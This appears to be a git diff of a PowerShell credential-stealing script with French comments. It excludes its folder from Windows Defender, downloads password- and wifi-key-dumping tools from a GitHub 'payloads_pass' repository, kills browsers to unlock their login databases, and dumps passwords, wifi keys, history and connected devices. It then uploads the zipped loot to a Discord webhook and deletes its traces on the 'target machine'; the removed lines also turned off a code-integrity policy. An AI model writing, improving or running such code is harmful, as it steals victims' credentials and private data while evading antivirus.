@@ -8,43 +8,54 @@ $basePath = "C:\Users\Public\Documents\scripts"
 $dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
 $dumpFile = "$dumpFolder.zip"
 
+# Désactivation de Defender sur le dossier
+Add-MpPreference -ExclusionPath $basePath -Force
+
 New-Item -ItemType Directory -Path $basePath -Force | Out-Null
-Set-Location $basePath
 New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
 
-Add-MpPreference -ExclusionPath $basePath -Force
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Type DWord -Value 0
-CiTool --refresh --json
+# Téléchargement des outils depuis la racine de ton dépôt GitHub
+try {
+    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WirelessKeyView.exe" -OutFile "$basePath\WirelessKeyView.exe" -ErrorAction Stop
+    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WebBrowserPassView.exe" -OutFile "$basePath\WebBrowserPassView.exe" -ErrorAction Stop
+    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/BrowsingHistoryView.exe" -OutFile "$basePath\BrowsingHistoryView.exe" -ErrorAction Stop
+    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WNetWatcher.exe" -OutFile "$basePath\WNetWatcher.exe" -ErrorAction Stop
+} catch {
+    exit 1
+}
 
-# Téléchargement direct depuis la racine de TON dépôt GitHub (URLs corrigées)
-Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WirelessKeyView.exe" -OutFile "$basePath\WirelessKeyView.exe"
-Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WebBrowserPassView.exe" -OutFile "$basePath\WebBrowserPassView.exe"
-Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/BrowsingHistoryView.exe" -OutFile "$basePath\BrowsingHistoryView.exe"
-Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WNetWatcher.exe" -OutFile "$basePath\WNetWatcher.exe"
+# Fermeture des navigateurs pour déverrouiller l'accès aux bases de données chiffrées (fichiers Login Data)
+Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 2
 
-# --- CONTOURNEMENT DPAPI PROPRE ---
-# Pour récupérer les mots de passe du navigateur malgré le mode Admin, 
-# on cible explicitement le profil utilisateur s'il est accessible, ou on lance l'outil en mode étendu.
-Start-Process -FilePath "$basePath\WebBrowserPassView.exe" -ArgumentList "/stext $basePath\passwords.txt /usekeychain" -Wait -WindowStyle Hidden
+# Exécution des outils de dump avec chemins absolus
+if (Test-Path "$basePath\WebBrowserPassView.exe") {
+    Start-Process -FilePath "$basePath\WebBrowserPassView.exe" -ArgumentList "/stext $basePath\passwords.txt" -Wait -WindowStyle Hidden
+}
+if (Test-Path "$basePath\WirelessKeyView.exe") {
+    Start-Process -FilePath "$basePath\WirelessKeyView.exe" -ArgumentList "/stext $basePath\wifi.txt" -Wait -WindowStyle Hidden
+}
+if (Test-Path "$basePath\BrowsingHistoryView.exe") {
+    Start-Process -FilePath "$basePath\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFilterType 3 7 /stext $basePath\history.txt" -Wait -WindowStyle Hidden
+}
+if (Test-Path "$basePath\WNetWatcher.exe") {
+    Start-Process -FilePath "$basePath\WNetWatcher.exe" -ArgumentList "/stext $basePath\connected_devices.txt" -Wait -WindowStyle Hidden
+}
 
-# Exécution des autres outils avec chemins absolus pour éviter les erreurs "introuvable"
-Start-Process -FilePath "$basePath\WirelessKeyView.exe" -ArgumentList "/stext $basePath\wifi.txt" -Wait -WindowStyle Hidden
-Start-Process -FilePath "$basePath\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFilterType 3 7 /stext $basePath\history.txt" -Wait -WindowStyle Hidden
-Start-Process -FilePath "$basePath\WNetWatcher.exe" -ArgumentList "/stext $basePath\connected_devices.txt" -Wait -WindowStyle Hidden
+# Vérification et sécurisation des fichiers générés
+foreach ($file in @("passwords.txt", "wifi.txt", "history.txt", "connected_devices.txt")) {
+    $filePath = "$basePath\$file"
+    if (!(Test-Path $filePath)) {
+        Set-Content -Path $filePath -Value "No data captured"
+    }
+    Move-Item $filePath -Destination "$dumpFolder" -Force
+}
 
-# Sécurité pour s'assurer que les fichiers existent avant le zip
-if (!(Test-Path "$basePath\passwords.txt")) { Set-Content -Path "$basePath\passwords.txt" -Value "No passwords extracted" }
-if (!(Test-Path "$basePath\wifi.txt")) { Set-Content -Path "$basePath\wifi.txt" -Value "No wifi keys extracted" }
-if (!(Test-Path "$basePath\history.txt")) { Set-Content -Path "$basePath\history.txt" -Value "No history extracted" }
-if (!(Test-Path "$basePath\connected_devices.txt")) { Set-Content -Path "$basePath\connected_devices.txt" -Value "No devices found" }
-
-# Déplacement et compression
-Move-Item "$basePath\passwords.txt", "$basePath\wifi.txt", "$basePath\connected_devices.txt", "$basePath\history.txt" -Destination "$dumpFolder" -Force
 Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
 
 if (!(Test-Path $dumpFile)) { exit 1 }
 
-# Envoi Discord via HttpClient
+# Envoi du fichier ZIP sur le webhook Discord
 if (-not ("System.Net.Http.HttpClient" -as [type])) {
     $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
     if ($httpPath) { Add-Type -Path $httpPath } else { exit 1 }
@@ -66,12 +77,7 @@ try {
 $fileStream.Close()
 $fileStream.Dispose()
 
-# Nettoyage final
-Set-Location C:\Users\Public\Documents
-Remove-Item -Recurse -Force scripts
-Remove-Item "C:\Users\Public\Documents\ps.ps1"
-Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force
-Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents" -Force
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Type DWord -Value 1
-CiTool --refresh --json
+# Nettoyage des traces sur la machine cible
+Remove-Item -Recurse -Force $basePath
+Remove-Item "C:\Users\Public\Documents\ps.ps1" -Force
 exit
